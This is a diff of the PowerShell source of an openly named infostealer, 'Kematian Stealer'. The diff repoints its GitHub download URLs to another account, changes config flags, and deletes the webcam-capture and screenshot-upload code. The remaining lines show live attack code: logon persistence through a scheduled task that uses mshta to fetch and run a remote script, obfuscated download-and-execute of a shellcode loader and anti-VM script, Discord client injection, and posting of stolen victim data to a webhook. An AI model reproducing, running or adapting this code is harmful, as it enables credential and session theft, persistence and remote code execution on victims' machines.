@@ -3,8 +3,8 @@ $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
-$fakeerror = $false
-$persistence = $true
+$fakeerror = $true
+$persistence = $false
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -81,10 +81,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/itzGlitxh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/itzGlitxh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -92,14 +92,14 @@ function Invoke-TASKS {
         Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
-        $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
+        $link = "https://github.com/itzGlitxh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
         iex (iwr -Uri $link -UseBasicParsing)
     }
     Backup-Data
 }
 
 function VMPROTECT {
-    $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+    $link = ("https://github.com/itzGlitxh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
     iex (iwr -uri $link -useb)
     Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
 }
@@ -788,17 +788,6 @@ function Backup-Data {
 	
     Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
-    # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
-    #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
-
-    # Fix webcam hang with unsupported devices
-    
-    Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
-    $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
-    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
-    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
-    $invokewebcam.WaitForExit()
-
     # Works since most victims will have a weak password which can be bruteforced
     #function ExportPrivateKeys {
     #    $privatekeysfolder = "$important_files\Certificates and Private Keys"
@@ -875,7 +864,7 @@ function Backup-Data {
                 foreach ($file in $files) {
                     if ($file.Name -eq "index.js") {
                         $webClient = New-Object System.Net.WebClient
-                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/itzGlitxh/Kematian-Stealer/main/frontend-src/injection.js")
                         if ($content -ne "") {
                             $replacedContent = $content -replace "%WEBHOOK%", $webhook
                             $replacedContent | Set-Content -Path $file.FullName -Force
@@ -889,7 +878,7 @@ function Backup-Data {
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
     Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
-    $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://github.com/itzGlitxh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
@@ -1094,7 +1083,7 @@ function Backup-Data {
         "embeds"     = @(
             @{
                 "title"       = "Kematian Stealer"
-                "url"         = "https://github.com/ChildrenOfYahweh/Kematian-Stealer"
+                "url"         = "https://github.com/itzGlitxh/Kematian-Stealer"
                 "description" = "New victim info collected !"
                 "color"       = "15105570"
                 "footer"      = @{
@@ -1139,34 +1128,6 @@ function Backup-Data {
 
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
-    
-    # Send webcam
-    
-    $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
-    foreach ($item in $items) { $name = $item.Name; Move-Item "$($item.FullName)" $folder_general -Force }
-    $jpegfiles = Get-ChildItem -Path $folder_general -Filter out*.jpg
-    foreach ($jpegfile in $jpegfiles) {
-        $name = $jpegfile.Name
-        $messageContent = @{content = "## :camera: Webcam" ; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
-        $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-        $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
-        $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0; $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
-        $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json"); $multipartContent.Add($streamContent, "payload_json")
-        $fileStream = [IO.File]::OpenRead("$folder_general\$name"); $fileContent = [Net.Http.StreamContent]::new($fileStream)
-        $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png"); $multipartContent.Add($fileContent, "file", "$folder_general\$name")
-        $httpClient.PostAsync($webhook, $multipartContent).Result
-    }
-
-    # Send screenshot
-    $messageContent = @{content = "## :desktop: Screenshot"; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
-    $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-    $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
-    $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
-    $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
-    $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
-    $multipartContent.Add($streamContent, "payload_json"); $fileStream = [IO.File]::OpenRead("$folder_general\screenshot.png")
-    $fileContent = [Net.Http.StreamContent]::new($fileStream); $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
-    $multipartContent.Add($fileContent, "file", "screenshot.png"); $httpClient.PostAsync($webhook, $multipartContent).Result
 
     # Send exfiltrated data
     $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
